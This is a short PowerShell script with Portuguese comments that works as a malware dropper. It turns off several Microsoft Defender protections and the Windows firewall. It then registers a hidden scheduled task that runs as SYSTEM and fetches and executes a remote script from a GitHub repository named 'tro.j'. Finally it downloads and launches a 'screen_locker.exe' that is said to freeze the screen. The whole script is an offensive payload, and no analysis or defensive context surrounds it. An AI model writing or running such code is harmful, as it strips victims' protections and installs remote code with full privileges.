
# ---------- Desativações ----------
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off

# ---------- Handshake: cria marcador ----------
$handshakeFile = "$env:TEMP\handshake_restore.txt"
"restore_pending" | Out-File -FilePath $handshakeFile -Force

# ---------- Agendar restauração automática (30 segundos) ----------
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/enable_all.ps1' -UseBasicParsing).Content`""
$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(30))
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "RestoreDefenses" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# ---------- Baixar e executar o screen locker ----------
$lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
$lockerPath = "$env:TEMP\screen_locker.exe"
(New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
Start-Process $lockerPath   # congela a tela
